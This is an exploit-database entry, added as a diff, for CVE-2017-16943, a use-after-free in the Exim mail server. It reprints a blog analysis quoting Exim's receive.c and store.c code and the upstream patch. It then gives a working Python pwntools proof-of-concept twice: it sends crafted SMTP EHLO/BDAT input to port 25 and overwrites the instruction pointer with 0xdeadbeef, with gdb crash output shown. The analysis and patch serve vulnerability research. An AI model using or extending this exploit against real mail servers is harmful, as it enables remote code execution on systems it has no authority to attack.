@@ -1,0 +1,188 @@
+id: 29082
+date: 11/30/2017
+title: Exim Use-After-Free Exploit
+author: bot
+cves: CVE-2017-16943
+
+On 25 November 2017 Phil Pennock announced the new release of Exim which included a fix for a use-after-free vulnerability which can result in Remote Code Execution (RCE). The vulnerability was reported by a user with the handle “meh” and it all starts in receive.c.
+
+BOOL
+receive_msg(BOOL extract_recip)
+{
+    ...
+  /* See if we are at the current header's size limit - there must be at least
+  four bytes left. This allows for the new character plus a zero, plus two for
+  extra insertions when we are playing games with dots and carriage returns. If
+  we are at the limit, extend the text buffer. This could have been done
+  automatically using string_cat() but because this is a tightish loop storing
+  only one character at a time, we choose to do it inline. Normally
+  store_extend() will be able to extend the block; only at the end of a big
+  store block will a copy be needed. To handle the case of very long headers
+  (and sometimes lunatic messages can have ones that are 100s of K long) we
+  call store_release() for strings that have been copied - if the string is at
+  the start of a block (and therefore the only thing in it, because we aren't
+  doing any other gets), the block gets freed. We can only do this because we
+  know there are no other calls to store_get() going on. */
+
+  if (ptr >= header_size - 4)
+    {
+    int oldsize = header_size;
+    /* header_size += 256; */
+    header_size *= 2;
+    if (!store_extend(next->text, oldsize, header_size))
+      {
+      uschar *newtext = store_get(header_size);
+      memcpy(newtext, next->text, ptr);
+      store_release(next->text);
+      next->text = newtext;
+      }
+    }
+    ...
+}
+
+The above function is used to parse the received messages and the specific snippet is related to the buffer that stores the header. If the header is too small the code will use store_extend() which will try to resize “next->text” from “oldsize” to “header_size”. As the original reporter noticed, store_extend() will fail if there is some other allocation between the allocation and the extension. This can be seen at store.c file as you can see below.
+
+BOOL
+store_extend_3(void *ptr, int oldsize, int newsize, const char *filename,
+  int linenumber)
+{
+int inc = newsize - oldsize;
+int rounded_oldsize = oldsize;
+
+if (rounded_oldsize % alignment != 0)
+  rounded_oldsize += alignment - (rounded_oldsize % alignment);
+
+if (CS ptr + rounded_oldsize != CS (next_yield[store_pool]) ||
+    inc > yield_length[store_pool] + rounded_oldsize - oldsize)
+  return FALSE;
+   ...
+}
+
+If we go back to the receive_msg() we will see that store_get() is called passing the “header_size” to it, if we look this function in store.c we will see that it actually splits the current block.
+
+void *
+store_get_3(int size, const char *filename, int linenumber)
+{
+    ...
+(void) VALGRIND_MAKE_MEM_UNDEFINED(store_last_get[store_pool], size);
+/* Update next pointer and number of bytes left in the current block. */
+
+next_yield[store_pool] = (void *)(CS next_yield[store_pool] + size);
+yield_length[store_pool] -= size;
+
+return store_last_get[store_pool];
+
+The next function being invoked by receive_msg() is the store_release() which as it is implied by its name it will try to release “next->text” which however still points to the whole block. This means that subsequent uses of this buffer result in a use-after-free scenario. Below you can see the store_release() function as defined in store.c.
+
+void
+store_release_3(void *block, const char *filename, int linenumber)
+{
+storeblock *b;
+
+/* It will never be the first block, so no need to check that. */
+
+for (b = chainbase[store_pool]; b != NULL; b = b->next)
+  {
+  storeblock *bb = b->next;
+  if (bb != NULL && CS block == CS bb + ALIGNED_SIZEOF_STOREBLOCK)
+    {
+    b->next = bb->next;
+    pool_malloc -= bb->length + ALIGNED_SIZEOF_STOREBLOCK;
+
+    /* Cut out the debugging stuff for utilities, but stop picky compilers
+    from giving warnings. */
+
+    #ifdef COMPILE_UTILITY
+    filename = filename;
+    linenumber = linenumber;
+    #else
+    DEBUG(D_memory)
+      {
+      if (running_in_test_harness)
+        debug_printf("-Release       %d\n", pool_malloc);
+      else
+        debug_printf("-Release %6p %-20s %4d %d\n", (void *)bb, filename,
+          linenumber, pool_malloc);
+      }
+    if (running_in_test_harness)
+      memset(bb, 0xF0, bb->length+ALIGNED_SIZEOF_STOREBLOCK);
+    #endif  /* COMPILE_UTILITY */
+
+    free(bb);
+    return;
+    }
+  }
+}
+
+To fix this vulnerability, Jeremy Harris introduced the following patch which introduces “release_ok” that checks that “store_last_get[store_pool]” points to the same location as “next->text” before proceeding with the store_release() invocation.
+
+     if (!store_extend(next->text, oldsize, header_size))
+       {
++      BOOL release_ok = store_last_get[store_pool] == next->text;
+       uschar *newtext = store_get(header_size);
+       memcpy(newtext, next->text, ptr);
+-      store_release(next->text);
++      if (release_ok) store_release(next->text);
+       next->text = newtext;
+
+To prove the exploitability of this vulnerability, “meh” uploaded a Python Proof-of-Concept exploit that manages to overwrite the instruction pointer with 0xdeadbeef on Ubuntu 16.04 with the latest release of Exim. You can see the Python PoC exploit below.
+
+# pip install pwntools
+from pwn import *
+
+r = remote('127.0.0.1', 25)
+
+r.recvline()
+r.sendline("EHLO test")
+r.recvuntil("250 HELP")
+r.sendline("MAIL FROM:<test@localhost>")
+r.recvline()
+r.sendline("RCPT TO:<test@localhost>")
+r.recvline()
+r.sendline('a'*0x1250+'\x7f')
+r.recvuntil('command')
+r.sendline('BDAT 1')
+r.sendline(':BDAT \x7f')
+s = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)
+r.send(s+ ':\r\n')
+r.recvuntil('command')
+r.send('\n')
+r.interactive()
+
+What it does is initiating an SMTP connection via EHLO and then starting the structuring of an email. Then we see the strange “r.sendline(‘a’*0x1250+’\x7f’)” which is an unrecognized command and the exploit code uses to adjust the “yield_length” to be less 0x100. The subsequently command sets the length of BDAT to 1 and it is followed by one BDAT character that is non-printable which means that it will reach the previously set limit. The latter will result in invoking store_get(). While Exim is still trying to read the header in receive_msg(), the author if this PoC exploit sends the huge constructed message resulting in the header size vulnerability we described above. You can see the result of this (as shown by the PoC author) below.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000deadbeef in ?? ()
+(gdb)
+
+
+POC Exploit:
+
+# pip install pwntools
+from pwn import *
+ 
+r = remote('127.0.0.1', 25)
+ 
+r.recvline()
+r.sendline("EHLO test")
+r.recvuntil("250 HELP")
+r.sendline("MAIL FROM:<test@localhost>")
+r.recvline()
+r.sendline("RCPT TO:<test@localhost>")
+r.recvline()
+r.sendline('a'*0x1250+'\x7f')
+r.recvuntil('command')
+r.sendline('BDAT 1')
+r.sendline(':BDAT \x7f')
+s = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)
+r.send(s+ ':\r\n')
+r.recvuntil('command')
+r.send('\n')
+r.interactive()
+
+
+Source
+https://xorl.wordpress.com/2017/11/26/cve-2017-16943-exim-use-after-free/
+
+
+#  0day.today [2023-03-26]  #
